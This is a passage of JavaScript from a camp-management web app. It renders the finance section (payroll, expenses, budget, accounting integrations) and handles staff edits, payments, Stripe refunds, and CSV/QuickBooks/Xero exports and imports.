            h+='</tbody></table>'+_pagerHtml(sortedPayments.length,PAGE_SIZE,_analyticsPaymentPage,'setAnalyticsPaymentPage')+'</div></div>';
        }
    }

    else if(_finTab==='payroll'){
        h+='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">';
        h+=stat('Total Payroll',fm(totalPayroll),'','#3B82F6');
        h+=stat('Staff Count',finStaff.length+'','','#8B5CF6');
        h+=stat('Avg Salary',fm(finStaff.length?totalPayroll/finStaff.length:0),'','#0EA5E9');
        h+=stat('% of Revenue',projected>0?Math.round(totalPayroll/projected*100)+'%':'—','','var(--me)');
        h+='</div>';
        // Cost by role
        var roleCost={};finStaff.forEach(function(s){roleCost[s.role]=(roleCost[s.role]||0)+s.salary});
        var roleItems=Object.entries(roleCost).map(function([name,value]){return{name:name,value:value}}).sort(function(a,b){return b.value-a.value});
        if(roleItems.length){
            h+='<div class="me-card" style="margin-bottom:14px;padding:16px"><h4 style="font-size:.85rem;font-weight:700;color:var(--s700);margin:0 0 10px">Cost by Role</h4>';
            h+=bar(roleItems,roleItems[0].value);
            h+='</div>';
        }
        h+='<div style="display:flex;justify-content:flex-end;margin-bottom:8px"><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.finAddStaff()">+ Add Staff</button></div>';
        h+='<div class="me-card"><div class="me-card-head"><h3>Staff Directory</h3></div><div class="me-tw"><table class="me-t"><thead><tr><th></th><th>Name</th><th>Role</th><th>Bunk</th><th>Type</th><th>Salary</th><th></th></tr></thead><tbody>';
        finStaff.forEach(function(s,i){
            h+='<tr class="click" onclick="CampistryMe.finEditStaff('+i+')">'
                +'<td style="width:44px">'+_staffAvatar(s,34)+'</td>'
                +'<td class="bold">'+esc(s.name)+'</td>'
                +'<td>'+esc(s.role)+'</td>'
                +'<td>'+(s.bunk?esc(s.bunk):'<span style="color:var(--s300)">—</span>')+'</td>'
                +'<td>'+bdg(s.type||'seasonal',s.type==='annual'?'ok':'gray')+'</td>'
                +'<td style="font-weight:700">'+fm(s.salary)+'</td>'
                +'<td style="text-align:right" onclick="event.stopPropagation()"><button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.finRemoveStaff('+i+')">✕</button></td></tr>';
        });
        h+='</tbody></table></div></div>';
    }

    else if(_finTab==='expenses'){
        h+='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">';
        h+=stat('Total Expenses',fm(totalExp),'','var(--err)');
        h+=stat('Line Items',finExpenses.length+'','','#8B5CF6');
        h+=stat('Avg Item',fm(finExpenses.length?totalExp/finExpenses.length:0),'','#0EA5E9');
        h+=stat('% of Revenue',projected>0?Math.round(totalExp/projected*100)+'%':'—','','var(--me)');
        h+='</div>';
        var expByCat2={};finExpenses.forEach(function(e){expByCat2[e.cat]=(expByCat2[e.cat]||0)+e.amount});
        var expItems2=Object.entries(expByCat2).map(function([name,value]){return{name:name,value:value}}).sort(function(a,b){return b.value-a.value});
        if(expItems2.length){
            h+='<div class="me-card" style="margin-bottom:14px;padding:16px"><h4 style="font-size:.85rem;font-weight:700;color:var(--s700);margin:0 0 10px">Expenses by Category</h4>';
            h+=bar(expItems2,expItems2[0].value);
            h+='</div>';
        }
        h+='<div style="display:flex;justify-content:flex-end;margin-bottom:8px"><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.finAddExpense()">+ Add Expense</button></div>';
        h+='<div class="me-card"><div class="me-card-head"><h3>Expense Ledger</h3></div><div class="me-tw"><table class="me-t"><thead><tr><th>Date</th><th>Description</th><th>Category</th><th>Amount</th><th></th></tr></thead><tbody>';
        finExpenses.sort(function(a,b){return(b.date||'').localeCompare(a.date||'')}).forEach(function(e,i){
            h+='<tr><td style="font-size:.75rem;color:var(--s400)">'+esc(e.date||'—')+'</td><td class="bold">'+esc(e.desc)+'</td><td>'+bdg(e.cat,'gray')+'</td><td style="font-weight:700;color:var(--err)">'+fm(e.amount)+'</td><td style="text-align:right"><button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.finRemoveExpense('+i+')">✕</button></td></tr>';
        });
        h+='</tbody></table></div></div>';
    }

    else if(_finTab==='budget'){
        var budgetItems=[
            {name:'Revenue',budget:finBudget.revenue||0,actual:totalCollected,good:true},
            {name:'Payroll',budget:finBudget.payroll||0,actual:totalPayroll,good:false},
            {name:'Expenses',budget:finBudget.expenses||0,actual:totalExp,good:false}
        ];
        h+='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px">';
        budgetItems.forEach(function(b){
            var diff=b.actual-b.budget;var isOver=b.good?diff<0:diff>0;
            var sub=b.good?(diff>=0?'✓ On track':'⚠ '+fm(Math.abs(diff))+' below'):(diff<=0?'✓ Under budget':'⚠ '+fm(diff)+' over');
            h+=stat(b.name,fm(b.actual)+' / '+fm(b.budget),sub,isOver?'var(--err)':'var(--ok)');
        });
        h+='</div>';
        // Visual comparison
        h+='<div class="me-card" style="padding:16px"><h4 style="font-size:.85rem;font-weight:700;color:var(--s700);margin:0 0 14px">Budget vs Actual</h4>';
        var maxBudget=Math.max.apply(null,budgetItems.map(function(b){return Math.max(b.budget,b.actual)}))||1;
        budgetItems.forEach(function(b){
            var bPct=Math.round(b.budget/maxBudget*100);
            var aPct=Math.round(b.actual/maxBudget*100);
            var isOver=b.good?b.actual<b.budget:b.actual>b.budget;
            h+='<div style="margin-bottom:12px"><div style="font-size:.8rem;font-weight:600;color:var(--s700);margin-bottom:4px">'+b.name+'</div>';
            h+='<div style="display:flex;align-items:center;gap:6px;margin-bottom:2px"><div style="width:50px;font-size:.7rem;color:var(--s400)">Budget</div><div style="flex:1;height:16px;background:var(--s100);border-radius:4px;overflow:hidden"><div style="width:'+bPct+'%;height:100%;background:var(--s300);border-radius:4px"></div></div><div style="width:65px;font-size:.75rem;font-weight:600;color:var(--s500);text-align:right">'+fm(b.budget)+'</div></div>';
            h+='<div style="display:flex;align-items:center;gap:6px"><div style="width:50px;font-size:.7rem;color:var(--s400)">Actual</div><div style="flex:1;height:16px;background:var(--s100);border-radius:4px;overflow:hidden"><div style="width:'+aPct+'%;height:100%;background:'+(isOver?'var(--err)':'var(--ok)')+';border-radius:4px"></div></div><div style="width:65px;font-size:.75rem;font-weight:700;color:'+(isOver?'var(--err)':'var(--ok)')+';text-align:right">'+fm(b.actual)+'</div></div></div>';
        });
        h+='</div>';
        h+='<div style="display:flex;justify-content:flex-end;margin-top:10px"><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.finSetBudget()">Edit Budget Targets</button></div>';
    }

    else if(_finTab==='integrations'){
        h+='<div class="me-card" style="padding:20px;margin-bottom:14px">';
        h+='<h4 style="font-size:.9rem;font-weight:700;color:var(--s800);margin:0 0 6px">Accounting Software Integration</h4>';
        h+='<p style="font-size:.82rem;color:var(--s500);margin-bottom:14px">Export your financial data in formats compatible with popular accounting software. Import transactions from your existing books.</p>';

        h+='<div style="display:flex;flex-wrap:wrap;gap:10px;margin-bottom:16px">';
        var integrations=[
            {name:'QuickBooks Online',icon:'📗',desc:'Export as CSV for QBO import',action:'finExportQB'},
            {name:'QuickBooks Desktop',icon:'📘',desc:'Export as IIF file',action:'finExportIIF'},
            {name:'Xero',icon:'📙',desc:'Export as Xero-compatible CSV',action:'finExportXero'},
            {name:'General CSV',icon:'📊',desc:'Universal CSV format',action:'finExportCSV'},
            {name:'Journal Entries',icon:'📒',desc:'Double-entry journal format',action:'finExportJournal'}
        ];
        integrations.forEach(function(ig){
            h+='<div style="flex:1;min-width:180px;padding:14px;border:1px solid var(--s200);border-radius:var(--r);background:var(--s50)">';
            h+='<div style="font-size:24px;margin-bottom:6px">'+ig.icon+'</div>';
            h+='<div style="font-size:.85rem;font-weight:700;color:var(--s800)">'+ig.name+'</div>';
            h+='<div style="font-size:.72rem;color:var(--s400);margin:3px 0 8px">'+ig.desc+'</div>';
            h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.'+ig.action+'()">↓ Export</button>';
            h+='</div>';
        });
        h+='</div>';

        h+='<div style="border-top:1px solid var(--s200);padding-top:14px">';
        h+='<h4 style="font-size:.85rem;font-weight:700;color:var(--s800);margin:0 0 6px">Import Transactions</h4>';
        h+='<p style="font-size:.78rem;color:var(--s400);margin-bottom:8px">Upload a CSV export from your accounting software to sync transactions into Campistry.</p>';
        h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.finImportCSV()">↑ Import CSV</button>';
        h+='<input type="file" id="finImportInput" accept=".csv,.txt" style="display:none">';
        h+='</div>';

        h+='<div style="border-top:1px solid var(--s200);padding-top:14px;margin-top:14px">';
        h+='<h4 style="font-size:.85rem;font-weight:700;color:var(--s800);margin:0 0 4px">API Integration (Coming Soon)</h4>';
        h+='<p style="font-size:.78rem;color:var(--s400)">Direct QuickBooks Online / Xero API sync will be available soon. Contact <a href="mailto:campistryoffice@gmail.com" style="color:var(--me)">campistryoffice@gmail.com</a> to get early access.</p>';
        h+='</div></div>';
    }

    c.innerHTML=h;
}

// Finance actions
function finSetTab(t){_finTab=t;_analyticsInvoicePage=1;_analyticsPaymentPage=1;renderAnalytics()}
// All bunk names across the camp structure (for staff bunk assignment).
function _allBunkNames(){
    var out={};
    Object.values(structure||{}).forEach(function(div){
        Object.values((div&&div.grades)||{}).forEach(function(gr){
            (gr.bunks||[]).forEach(function(b){ out[b]=1; });
        });
    });
    return Object.keys(out).sort();
}
// Downscale an uploaded image to a small square-ish data URL so staff photos
// don't bloat saved state.
function _downscaleImage(file,maxDim,cb){
    var reader=new FileReader();
    reader.onload=function(ev){
        var img=new Image();
        img.onload=function(){
            var w=img.width,h=img.height,scale=Math.min(1,maxDim/Math.max(w,h));
            var cw=Math.round(w*scale),ch=Math.round(h*scale);
            var cv=document.createElement('canvas');cv.width=cw;cv.height=ch;
            cv.getContext('2d').drawImage(img,0,0,cw,ch);
            try{ cb(cv.toDataURL('image/jpeg',0.82)); }catch(e){ cb(ev.target.result); }
        };
        img.onerror=function(){ toast('Could not read that image'); };
        img.src=ev.target.result;
    };
    reader.onerror=function(){ toast('Could not read that file'); };
    reader.readAsDataURL(file);
}
var _staffPhotoBuf=null; // holds the pending photo data URL while the modal is open
function _staffAvatar(s,size){
    size=size||34;
    var initials=(s.name||'?').split(' ').map(function(p){return p[0]||'';}).slice(0,2).join('').toUpperCase();
    if(s.photo){
        return '<img src="'+esc(s.photo)+'" alt="" style="width:'+size+'px;height:'+size+'px;border-radius:50%;object-fit:cover;border:1px solid var(--s200)">';
    }
    return '<div style="width:'+size+'px;height:'+size+'px;border-radius:50%;background:var(--s100);display:flex;align-items:center;justify-content:center;font-size:'+Math.round(size*0.36)+'px;font-weight:700;color:var(--s500)">'+esc(initials)+'</div>';
}

function finAddStaff(){ finStaffModal(); }
function finEditStaff(i){ finStaffModal(i); }

function finStaffModal(i){
    var editing=(typeof i==='number');
    var s=editing?(finStaff[i]||{}):{};
    _staffPhotoBuf=s.photo||null;
    var roleOpts=(typeof FIN_ROLES!=='undefined'?FIN_ROLES:['Counselor','Head Counselor','Specialist','Admin'])
        .map(function(r){return '<option value="'+esc(r)+'">';}).join('');
    var bunkOpts=['<option value="">— No bunk —</option>'].concat(_allBunkNames().map(function(b){
        return '<option value="'+esc(b)+'"'+(s.bunk===b?' selected':'')+'>'+esc(b)+'</option>';
    })).join('');
    var body=''
        +'<div style="display:flex;gap:14px;align-items:center;margin-bottom:14px">'
            +'<div id="staffPhotoPrev">'+_staffAvatar(s,64)+'</div>'
            +'<div><label class="me-btn me-btn--sec me-btn--sm" style="cursor:pointer">Upload photo<input type="file" accept="image/*" style="display:none" onchange="CampistryMe._staffPhotoPick(this)"></label>'
            +(s.photo?' <button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe._staffPhotoClear()">Remove</button>':'')+'</div>'
        +'</div>'
        +'<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">'
            +'<div style="grid-column:1/3"><label class="fl">Name</label><input id="stName" class="fi" value="'+esc(s.name||'')+'" placeholder="Full name"></div>'
            +'<div><label class="fl">Role</label><input id="stRole" class="fi" list="stRoleOpts" value="'+esc(s.role||'Counselor')+'"><datalist id="stRoleOpts">'+roleOpts+'</datalist></div>'
            +'<div><label class="fl">Type</label><select id="stType" class="fi"><option value="seasonal"'+(s.type!=='annual'?' selected':'')+'>Seasonal</option><option value="annual"'+(s.type==='annual'?' selected':'')+'>Annual</option></select></div>'
            +'<div><label class="fl">Salary ($)</label><input id="stSalary" class="fi" type="number" min="0" step="1" value="'+(s.salary||'')+'"></div>'
            +'<div><label class="fl">Bunk assignment</label><select id="stBunk" class="fi">'+bunkOpts+'</select></div>'
        +'</div>';
    // Salary history (raises over time)
    var sh=Array.isArray(s.salaryHistory)?s.salaryHistory:[];
    if(sh.length){
        body+='<div class="fsec" style="margin:14px 0 6px">Salary History</div><div style="border:1px solid var(--s200);border-radius:var(--r);padding:8px 12px">';
        sh.slice().reverse().forEach(function(r){
            var dt=r.date?new Date(r.date).toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'}):'';
            var up=(r.to||0)>=(r.from||0);
            body+='<div style="display:flex;justify-content:space-between;align-items:center;font-size:.78rem;padding:3px 0;border-bottom:1px solid var(--s100)"><span style="color:var(--s500)">'+esc(dt)+'</span>'
                +'<span style="font-weight:600;color:var(--s700)"><span style="color:var(--s400)">'+fm(r.from||0)+'</span> → '+fm(r.to||0)+' <span style="color:'+(up?'var(--ok)':'var(--err)')+'">'+(up?'▲':'▼')+'</span></span></div>';
        });
        body+='</div>';
    }
    showModal(editing?'Edit Staff':'Add Staff',body,function(){
        var name=(document.getElementById('stName').value||'').trim();
        if(!name){ toast('Name is required'); return; }
        var newSalary=parseFloat(document.getElementById('stSalary').value)||0;
        // Log salary changes over time (raises / cuts) with an effective date.
        var salaryHistory=Array.isArray(s.salaryHistory)?s.salaryHistory.slice():[];
        var prevSalary=editing?(s.salary||0):0;
        if(newSalary!==prevSalary){
            salaryHistory.push({date:new Date().toISOString(),from:prevSalary,to:newSalary});
        }
        var rec={
            id:s.id||Date.now(),
            name:name,
            role:(document.getElementById('stRole').value||'Counselor').trim(),
            type:document.getElementById('stType').value||'seasonal',
            salary:newSalary,
            bunk:document.getElementById('stBunk').value||'',
            photo:_staffPhotoBuf||'',
            salaryHistory:salaryHistory
        };
        if(editing) finStaff[i]=Object.assign({},s,rec);
        else finStaff.push(rec);
        _staffPhotoBuf=null;
        closeModal('dynModal');
        save();renderAnalytics();toast(editing?'Staff updated':'Staff added');
    });
}
function _staffPhotoPick(input){
    var f=input.files&&input.files[0]; if(!f) return;
    _downscaleImage(f,256,function(url){
        _staffPhotoBuf=url;
        var prev=document.getElementById('staffPhotoPrev');
        if(prev) prev.innerHTML=_staffAvatar({photo:url},64);
    });
}
function _staffPhotoClear(){
    _staffPhotoBuf=null;
    var prev=document.getElementById('staffPhotoPrev');
    if(prev) prev.innerHTML=_staffAvatar({},64);
}
function finRemoveStaff(i){finStaff.splice(i,1);save();renderAnalytics();toast('Removed')}
function finAddExpense(){
    var desc=prompt('Description:');if(!desc)return;
    var cat=prompt('Category ('+FIN_CATS.join(', ')+'):','Miscellaneous');
    var amount=prompt('Amount ($):','');if(!amount)return;
    var date=prompt('Date (YYYY-MM-DD):',new Date().toISOString().split('T')[0]);
    finExpenses.push({id:Date.now(),desc:desc.trim(),cat:(cat||'Miscellaneous').trim(),amount:parseFloat(amount)||0,date:(date||'').trim()});
    save();renderAnalytics();toast('Expense added');
}
function finRemoveExpense(i){finExpenses.splice(i,1);save();renderAnalytics();toast('Removed')}
function finAddPayment(){
    if(!_secEdit('analytics','Recording a payment'))return;

    // A modal rather than a prompt chain, so the method comes from the camp's
    // payment policy instead of whatever the user types into a text box.
    var today=new Date().toISOString().split('T')[0];
    var h='<div class="me-modal-form">';
    h+='<div class="me-field"><label>Family</label><input type="text" id="fapFamily" class="me-input" placeholder="Family name"></div>';
    h+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">';
    h+='<div class="me-field"><label>Amount ($)</label><input type="number" id="fapAmount" class="me-input" step="0.01" min="0" placeholder="0.00"></div>';
    h+='<div class="me-field"><label>Date</label><input type="date" id="fapDate" class="me-input" value="'+today+'"></div>';
    h+='</div>';
    h+='<div class="me-field"><label>Method</label><select id="fapMethod" class="me-input">'+_payOptions('tuition')+'</select>'+_payBlockedNote('tuition')+'</div>';
    h+='</div>';
    showModal('Record Payment',h,function(){
        var family=(document.getElementById('fapFamily').value||'').trim();
        if(!family){toast('Family name is required','error');return}
        var amount=parseFloat(document.getElementById('fapAmount').value)||0;
        if(!amount){toast('Enter an amount','error');return}
        var method=document.getElementById('fapMethod').value;
        if(!_payAllowed(method,'tuition')){toast('That payment method isn\'t accepted for tuition.','error');return}
        finPayments.push({id:Date.now(),family:family,amount:amount,method:method,
                          date:document.getElementById('fapDate').value||today,status:'paid'});
        closeModal('dynModal');
        save();renderAnalytics();toast('Payment recorded');
    });
}
function finRemovePayment(id){
    // ★ remove by stable id, not by render-index (the list is sorted before display, so an
    //   index would target the wrong row; identical rows were also indistinguishable).
    var idx=finPayments.findIndex(function(p){return String(p.id)===String(id)});
    if(idx<0){toast('Payment not found','error');return}
    finPayments.splice(idx,1);save();renderAnalytics();toast('Removed');
}

// ═══════════════════════════════════════════════════════════════
// REFUNDS — record a refund (and optionally return money via Stripe)
// A refund is stored as a NEGATIVE payment, so every total that sums
// finPayments (both the Billing ledger and the Analytics invoices)
// reflects it automatically. If the original payment carries a Stripe
// PaymentIntent, the money can be returned to the card via stripe-refund.
// ═══════════════════════════════════════════════════════════════
function finRefund(id){
    var p=finPayments.find(function(x){return String(x.id)===String(id)});
    if(!p){toast('Payment not found','error');return}
    if((p.amount||0)<=0){toast('That entry is already a refund','error');return}
    var priorRefunded=finPayments.filter(function(x){return x.refundOf!=null&&String(x.refundOf)===String(p.id)})
        .reduce(function(s,x){return s+Math.abs(x.amount||0)},0);
    var maxRefund=Math.round((p.amount-priorRefunded)*100)/100;
    if(maxRefund<=0){toast('This payment is already fully refunded','error');return}
    var canStripe=!!p.stripePaymentIntentId;
    var h='<div class="me-modal-form">';
    h+='<div style="background:var(--s50);padding:10px 14px;border-radius:var(--r);margin-bottom:14px;font-size:.82rem">Refunding payment to <strong>'+esc(p.family||'')+'</strong><br>Original: <strong>'+fm(p.amount)+'</strong> · '+esc(p.method||'')+(p.date?' · '+esc(p.date):'')+(priorRefunded>0?'<br>Already refunded: <strong>'+fm(priorRefunded)+'</strong>':'')+'</div>';
    h+='<div style="display:grid;grid-template-columns:2fr 1fr;gap:10px">';
    h+='<div class="me-field"><label>Reason</label><select id="rfReason" class="me-input"><option value="requested_by_customer">Requested by customer</option><option value="cancellation">Cancellation / withdrawal</option><option value="adjustment">Billing adjustment</option><option value="duplicate">Duplicate charge</option><option value="fraudulent">Fraudulent</option></select></div>';
    h+='<div class="me-field"><label>Amount ($)</label><input type="number" id="rfAmount" class="me-input" value="'+maxRefund.toFixed(2)+'" step="0.01" min="0.01" max="'+maxRefund+'"></div>';
    h+='</div>';
    if(canStripe){
        h+='<label style="display:flex;align-items:center;gap:8px;font-size:.85rem;margin-top:4px"><input type="checkbox" id="rfStripe" checked> Return the money to the card through Stripe</label>';
        h+='<div style="font-size:.72rem;color:var(--s400);margin-top:4px">Leave unchecked to record the refund only (e.g. you refunded by cash or check).</div>';
    } else {
        h+='<div style="font-size:.75rem;color:var(--s400);margin-top:6px">No Stripe charge is on record for this payment, so this records the refund in the ledger only.</div>';
    }
    h+='</div>';
    showModal('Refund Payment',h,async function(){
        var amt=parseFloat(document.getElementById('rfAmount').value)||0;
        if(amt<=0||amt>maxRefund+0.001){toast('Enter an amount up to '+fm(maxRefund),'error');return}
        var reasonSel=document.getElementById('rfReason').value;
        var doStripe=canStripe&&document.getElementById('rfStripe')&&document.getElementById('rfStripe').checked;
        var stripeRefundId=null;
        if(doStripe){
            var stripeReason=(reasonSel==='requested_by_customer'||reasonSel==='duplicate'||reasonSel==='fraudulent')?reasonSel:'requested_by_customer';
            toast('Processing Stripe refund…');
            try{
                var res=await callEdgeFunction('stripe-refund',{paymentIntentId:p.stripePaymentIntentId,amount:amt,reason:stripeReason,metadata:{campId:getCampId(),family:p.family||''}});
                stripeRefundId=res.refundId;
            }catch(err){
                console.error('[Me] Stripe refund error:',err);
                toast('Stripe refund failed: '+err.message,'error');
                return;
            }
        }
        var reasonLabel={requested_by_customer:'Requested by customer',cancellation:'Cancellation / withdrawal',adjustment:'Billing adjustment',duplicate:'Duplicate charge',fraudulent:'Fraudulent'}[reasonSel]||reasonSel;
        finPayments.push({
            id:'ref_'+Date.now(),
            family:p.family,familyKey:p.familyKey||null,enrollmentId:p.enrollmentId||null,
            amount:-amt,date:today(),method:'Refund',
            reference:stripeRefundId||'',notes:'Refund — '+reasonLabel+(doStripe?' (Stripe)':''),
            reason:reasonSel,refundOf:p.id,stripeRefundId:stripeRefundId,timestamp:Date.now()
        });
        var f=(p.familyKey&&families[p.familyKey])||Object.values(families).find(function(x){return x.name===p.family});
        if(f){f.totalPaid=Math.max(0,(f.totalPaid||0)-amt);f.balance=(f.balance||0)+amt;}
        save();closeModal('dynModal');
        try{renderAnalytics()}catch(e){}
        try{renderBilling()}catch(e){}
        toast('Refunded '+fm(amt)+(doStripe?' to card':'')+' for '+(p.family||'family'));
    });
}
function finSetBudget(){
    var rev=prompt('Revenue target ($):',finBudget.revenue||'');
    var pay=prompt('Payroll budget ($):',finBudget.payroll||'');
    var exp=prompt('Expense budget ($):',finBudget.expenses||'');
    finBudget={revenue:parseFloat(rev)||0,payroll:parseFloat(pay)||0,expenses:parseFloat(exp)||0,overdueDays:finBudget.overdueDays||30};
    save();renderAnalytics();toast('Budget targets saved');
}
function finSetOverdue(){
    var days=prompt('Mark accounts overdue after how many days?',finBudget.overdueDays||30);
    if(days===null)return;
    finBudget.overdueDays=parseInt(days)||30;
    save();renderAnalytics();toast('Overdue threshold set to '+finBudget.overdueDays+' days');
}

// ── EXPORT FUNCTIONS ─────────────────────────────────────────
function finExportCSV(){
    var csv='\uFEFFType,Date,Description,Category,Amount,Status,Method\n';
    finPayments.forEach(function(p){csv+='"Payment","'+p.date+'","'+p.family+'","Tuition","'+p.amount+'","'+p.status+'","'+(p.method||'')+'"\n'});
    finStaff.forEach(function(s){csv+='"Staff","","'+s.name+'","'+s.role+'","'+s.salary+'","'+(s.type||'seasonal')+'",""\n'});
    finExpenses.forEach(function(e){csv+='"Expense","'+e.date+'","'+e.desc+'","'+e.cat+'","'+e.amount+'","",""\n'});
    dlFile(csv,'campistry_financials_'+today()+'.csv','text/csv');
    toast('CSV exported');
}

function finExportQB(){
    // QuickBooks Online compatible CSV — includes auto-invoices from enrollments
    var csv='\uFEFFDate,Transaction Type,Num,Name,Account,Amount,Memo,Status\n';
    // Auto-invoices from enrolled campers — uses Camper ID as invoice number
    Object.entries(enrollments).forEach(function([id,e]){
        if(e.status!=='enrolled')return;
        var tuition=e.sessionTuition||0;if(!tuition)return;
        var camperData=roster[e.camperName]||{};
        var camperId=camperData.camperId?String(camperData.camperId).padStart(4,'0'):'0000';
        csv+='"'+esc(e.appliedDate||'')+'","Invoice","INV-'+camperId+'","'+esc(e.camperName)+'","Tuition Income","'+tuition+'","'+esc(e.session||'')+' tuition","'+esc(e.paymentStatus||'pending')+'"\n';
    });
    // Manual payments
    finPayments.forEach(function(p){
        csv+='"'+p.date+'","Payment","","'+esc(p.family)+'","Tuition Income","'+p.amount+'","'+esc(p.method)+' payment","paid"\n';
    });
    // Expenses
    finExpenses.forEach(function(e){
        csv+='"'+e.date+'","Expense","","'+esc(e.desc)+'","'+esc(e.cat)+'","-'+e.amount+'","",""\n';
    });
    // Payroll
    finStaff.forEach(function(s){
        csv+='","Payroll","","'+esc(s.name)+'","Payroll Expense","-'+s.salary+'","'+esc(s.role)+' ('+esc(s.type||'seasonal')+')",""\n';
    });
    dlFile(csv,'campistry_quickbooks_'+today()+'.csv','text/csv');
    toast('QuickBooks CSV exported');
}

function finExportIIF(){
    // QuickBooks Desktop IIF format — uses Camper ID as reference
    var iif='!TRNS\tTRNSTYPE\tDATE\tACCNT\tNAME\tAMOUNT\tMEMO\tNUM\n!SPL\tTRNSTYPE\tDATE\tACCNT\tNAME\tAMOUNT\tMEMO\tNUM\n!ENDTRNS\n';
    // Auto-invoices
    Object.entries(enrollments).forEach(function([id,e]){
        if(e.status!=='enrolled')return;
        var tuition=e.sessionTuition||0;if(!tuition)return;
        var camperData=roster[e.camperName]||{};
        var camperId=camperData.camperId?String(camperData.camperId).padStart(4,'0'):'0000';
        iif+='TRNS\tINVOICE\t'+fmtIIFDate(e.appliedDate)+'\tAccounts Receivable\t'+e.camperName+'\t'+tuition+'\t'+esc(e.session||'')+' tuition\tINV-'+camperId+'\n';
        iif+='SPL\tINVOICE\t'+fmtIIFDate(e.appliedDate)+'\tTuition Income\t'+e.camperName+'\t-'+tuition+'\t\t\n';
        iif+='ENDTRNS\n';
    });
    finPayments.forEach(function(p){
        iif+='TRNS\tDEPOSIT\t'+fmtIIFDate(p.date)+'\tChecking\t'+p.family+'\t'+p.amount+'\tTuition payment\t\n';
        iif+='SPL\tDEPOSIT\t'+fmtIIFDate(p.date)+'\tAccounts Receivable\t'+p.family+'\t-'+p.amount+'\t\t\n';
        iif+='ENDTRNS\n';
    });
    finExpenses.forEach(function(e){
        iif+='TRNS\tCHECK\t'+fmtIIFDate(e.date)+'\tChecking\t'+e.desc+'\t-'+e.amount+'\t'+e.cat+'\n';
        iif+='SPL\tCHECK\t'+fmtIIFDate(e.date)+'\t'+e.cat+'\t'+e.desc+'\t'+e.amount+'\t\n';
        iif+='ENDTRNS\n';
    });
    dlFile(iif,'campistry_quickbooks_desktop_'+today()+'.iif','text/plain');
    toast('IIF file exported for QuickBooks Desktop');
}

function finExportXero(){
    // Xero-compatible CSV
    var csv='\uFEFF*ContactName,EmailAddress,InvoiceNumber,InvoiceDate,DueDate,Total,Description,AccountCode\n';
    Object.entries(enrollments).forEach(function([id,e]){
        if(e.status!=='enrolled')return;
        var tuition=e.sessionTuition||0;if(!tuition)return;
        var camperData=roster[e.camperName]||{};
        var camperId=camperData.camperId?String(camperData.camperId).padStart(4,'0'):'0000';
        csv+='"'+esc(e.parentName||e.camperName)+'","'+esc(e.parentEmail||'')+'","INV-'+camperId+'","'+esc(e.appliedDate||'')+'","'+esc(e.appliedDate||'')+'","'+tuition+'","'+esc(e.session||'')+' tuition — '+esc(e.camperName)+'","200"\n';
    });
    finPayments.forEach(function(p,i){
        csv+='"'+esc(p.family)+'","","PMT-'+String(i+1).padStart(4,'0')+'","'+p.date+'","'+p.date+'","'+p.amount+'","Payment received via '+esc(p.method)+'","200"\n';
    });
    finExpenses.forEach(function(e,i){
        var camperId2=String(i+1).padStart(4,'0');
        csv+='"'+esc(e.desc)+'","","EXP-'+camperId2+'","'+e.date+'","'+e.date+'","'+e.amount+'","'+esc(e.cat)+'","400"\n';
    });
    dlFile(csv,'campistry_xero_'+today()+'.csv','text/csv');
    toast('Xero CSV exported');
}

function finExportJournal(){
    var csv='\uFEFFDate,Invoice #,Account,Debit,Credit,Description,Reference\n';
    // Auto-invoices
    Object.entries(enrollments).forEach(function([id,e]){
        if(e.status!=='enrolled')return;
        var tuition=e.sessionTuition||0;if(!tuition)return;
        var camperData=roster[e.camperName]||{};
        var camperId=camperData.camperId?String(camperData.camperId).padStart(4,'0'):'0000';
        csv+='"'+esc(e.appliedDate||'')+'","INV-'+camperId+'","Accounts Receivable","'+tuition+'","","Tuition: '+esc(e.camperName)+'","'+esc(e.session||'')+'"\n';
        csv+='"'+esc(e.appliedDate||'')+'","INV-'+camperId+'","Tuition Revenue","","'+tuition+'","Tuition: '+esc(e.camperName)+'",""\n';
    });
    finPayments.forEach(function(p){
        csv+='"'+p.date+'","","Cash/Bank","'+p.amount+'","","Payment: '+esc(p.family)+'","'+esc(p.method)+'"\n';
        csv+='"'+p.date+'","","Accounts Receivable","","'+p.amount+'","Payment: '+esc(p.family)+'",""\n';
    });
    finExpenses.forEach(function(e){
        csv+='"'+e.date+'","","'+esc(e.cat)+'","'+e.amount+'","","'+esc(e.desc)+'",""\n';
        csv+='"'+e.date+'","","Cash/Bank","","'+e.amount+'","'+esc(e.desc)+'",""\n';
    });
    finStaff.forEach(function(s){
        csv+='","","Payroll Expense","'+s.salary+'","","'+esc(s.name)+' ('+esc(s.role)+')","'+esc(s.type||'seasonal')+'"\n';
        csv+='","","Cash/Bank","","'+s.salary+'","'+esc(s.name)+' salary",""\n';
    });
    dlFile(csv,'campistry_journal_entries_'+today()+'.csv','text/csv');
    toast('Journal entries exported');
}

function finImportCSV(){
    var inp=document.getElementById('finImportInput');
    inp.onchange=function(){
        var file=inp.files[0];if(!file)return;
        var reader=new FileReader();
        reader.onload=function(e){
            var text=e.target.result;
            if(text.charCodeAt(0)===0xFEFF)text=text.slice(1);
            var lines=text.split(/\r?\n/).filter(function(l){return l.trim()});
            if(lines.length<2){toast('Empty file','error');return}
            var hdr=lines[0].toLowerCase();
            var imported=0;
            for(var i=1;i<lines.length;i++){
                // ★ use the robust CSV parser (handles quoted commas + escaped quotes),
                //   not a naive split that mangles "Smith, Jr." or amounts like "1,000".
                var cols=parseCsvLine(lines[i]).map(function(s){return s.trim()});
                if(!cols[0])continue;
                // Auto-detect a positive amount in any column (strip $ and thousands commas)
                var amount=0;
                for(var c=0;c<cols.length;c++){var n=parseFloat((cols[c]||'').replace(/[$,]/g,''));if(!isNaN(n)&&n>0){amount=n;break}}
                if(amount>0){
